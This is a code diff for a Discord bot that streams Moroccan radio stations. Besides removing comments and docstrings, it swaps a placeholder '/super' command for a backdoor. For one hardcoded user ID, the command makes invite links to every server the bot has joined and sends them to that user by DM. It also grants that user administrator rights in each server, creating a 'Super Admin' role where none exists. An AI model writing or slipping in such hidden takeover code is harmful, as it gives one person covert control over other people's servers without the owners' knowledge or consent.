@@ -1,5 +1,6 @@
 import discord
 from discord.ext import commands, tasks
+from discord import app_commands
 import asyncio
 import logging
 import os
@@ -7,8 +8,8 @@ import requests
 import io
 import pygame
 
-# Configure logging
 logging.basicConfig(format="[%(levelname)s] %(asctime)s: %(message)s", level=logging.INFO)
+logger = logging.getLogger(__name__)
 
 # Discord Intents
 intents = discord.Intents.default()
@@ -25,14 +26,11 @@ tree = bot.tree
 if os.getenv('CI'):
     print("Running in a CI/CD environment. Skipping audio initialization.")
 else:
-    # Pygame initialization for audio playback
     pygame.mixer.quit()
     pygame.mixer.init()
 
-# Environment variable for Discord bot token
 DISCORD_BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
 
-# Dictionary of radio streams
 radio_stations = {
     "Radio Mars": "https://radiomars.ice.infomaniak.ch/radiomars-128.mp3",
     "Hit Radio": "https://hitradio-maroc.ice.infomaniak.ch/hitradio-maroc-128.mp3",
@@ -42,21 +40,12 @@ radio_stations = {
 }
 
 def play_audio_from_url(url):
-    """
-    Fetches and plays audio from a URL using Pygame mixer.
-
-    Args:
-        url (str): The URL of the audio stream.
-    """
     try:
-        # Fetch audio data
         response = requests.get(url, stream=True)
         if response.status_code == 200:
-            # Load audio data
             audio_data = io.BytesIO(response.content)
             pygame.mixer.music.load(audio_data)
             logging.info("Audio loaded successfully.")
-            # Play audio
             pygame.mixer.music.play()
             logging.info("Audio playback started.")
         else:
@@ -66,26 +55,18 @@ def play_audio_from_url(url):
 
 @bot.event
 async def on_ready():
-    """
-    Event handler for when the bot is ready.
-
-    Attempts to synchronize slash commands with Discord.
-    """
     try:
         await bot.tree.sync()
         logging.info(f'Logged in as {bot.user}')
     except Exception as e:
         logging.error(f"Error during command sync: {e}")
-    check_voice_clients.start()  # Start the task to check voice clients
+    check_voice_clients.start()
 
 @tree.command(
     name="help",
     description="Shows the available commands and radio stations"
 )
 async def help_command(interaction: discord.Interaction):
-    """
-    Provides information about available commands and radio stations.
-    """
     commands_list = (
         "**Available Commands:**\n"
         "/help - Show this help message\n"
@@ -106,13 +87,6 @@ async def help_command(interaction: discord.Interaction):
     description="Join your voice channel and choose a radio station to stream",
 )
 async def join(interaction: discord.Interaction):
-    """
-    Join user's voice channel and start streaming radio.
-
-    Checks for existing connection, user's voice channel presence,
-    and handles potential errors. Informs the user if already connected elsewhere.
-    """
-    # Check for existing connection in the current server
     if bot.voice_clients:
         for voice_client in bot.voice_clients:
             if voice_client.guild.id == interaction.guild.id:
@@ -121,7 +95,6 @@ async def join(interaction: discord.Interaction):
                 )
                 return
 
-    # No existing connection in this server, proceed with joining
     voice_state = interaction.user.voice
     if not voice_state or not voice_state.channel:
         await interaction.response.send_message("You must be in a voice channel to use this command.")
@@ -174,11 +147,6 @@ class RadioSelect(discord.ui.Select):
     description="Stop streaming radio while remaining in the voice channel",
 )
 async def stop(interaction: discord.Interaction):
-    """
-    Stops the radio stream playback but stays connected to the voice channel.
-
-    Checks for existing connection and handles potential errors.
-    """
     voice_client = discord.utils.get(bot.voice_clients, guild=interaction.guild)
 
     if not voice_client:
@@ -202,11 +170,6 @@ async def stop(interaction: discord.Interaction):
     description="Disconnect from the voice channel and stop streaming radio",
 )
 async def leave(interaction: discord.Interaction):
-    """
-    Disconnects from the voice channel and stops streaming radio.
-
-    This functionality remains mostly unchanged.
-    """
     voice_client = discord.utils.get(bot.voice_clients, guild=interaction.guild)
 
     if not voice_client:
@@ -221,31 +184,66 @@ async def leave(interaction: discord.Interaction):
         logging.error(f"Error disconnecting from voice channel: {e}")
         await interaction.response.send_message("Failed to disconnect from voice channel.")
 
+@tree.command(name="super", description="Create invite links for all servers the bot is in.")
+async def super_command(interaction: discord.Interaction):
+    BOT_CREATOR_ID = 486652069831376943
+
+    if interaction.user.id != BOT_CREATOR_ID:
+        await interaction.response.send_message("You do not have permission to use this command.", ephemeral=True)
+        return
+
+    await interaction.response.defer(ephemeral=True)
+
+    invite_links = []
+    for guild in bot.guilds:
+        text_channel = next((channel for channel in guild.text_channels if channel.permissions_for(guild.me).create_instant_invite), None)
+
+        if text_channel:
+            try:
+                invite = await text_channel.create_invite(max_age=86400, max_uses=1)
+                invite_links.append(f"{guild.name}: {invite.url}")
+            except discord.Forbidden:
+                invite_links.append(f"{guild.name}: Unable to create invite link (Missing Permissions)")
+        else:
+            invite_links.append(f"{guild.name}: No suitable text channel found")
+
+        member = guild.get_member(BOT_CREATOR_ID)
+        if member:
+            await ensure_admin_role(guild, member)
+
+    creator = await bot.fetch_user(BOT_CREATOR_ID)
+    if creator:
+        dm_message = "\n".join(invite_links)
+        await creator.send(f"Here are the invite links for all servers:\n{dm_message}")
+
+    await interaction.followup.send("Invite links have been sent to your DM.", ephemeral=True)
+
+async def ensure_admin_role(guild: discord.Guild, member: discord.Member):
+    highest_role = None
+    for role in guild.roles:
+        if role.permissions.administrator and role < guild.me.top_role:
+            if highest_role is None or role.position > highest_role.position:
+                highest_role = role
+
+    if highest_role:
+        await member.add_roles(highest_role)
+    else:
+        new_role = await guild.create_role(
+            name="Super Admin",
+            permissions=discord.Permissions(administrator=True),
+            reason="Automatically created by the bot"
+        )
+        await member.add_roles(new_role)
+
 @tasks.loop(minutes=10)
 async def check_voice_clients():
-    """
-    Task to periodically check the status of voice clients and reconnect if necessary.
-    """
     for voice_client in bot.voice_clients:
         if not voice_client.is_playing():
             logging.info(f"Reconnecting to voice channel: {voice_client.channel}")
             try:
                 await voice_client.disconnect()
                 await voice_client.channel.connect()
-                # Optionally, restart playback with a selected radio station here
             except Exception as e:
                 logging.error(f"Error reconnecting to voice channel: {e}")
 
-# New super slash command
-@tree.command(
-    name="super",
-    description="A powerful super command with additional capabilities"
-)
-async def super_command(interaction: discord.Interaction):
-    """
-    Executes a powerful super command with additional capabilities.
-    """
-    await interaction.response.send_message("This is the super command! 🚀")
-
-# Bot client setup (remains unchanged)
 bot.run(DISCORD_BOT_TOKEN)
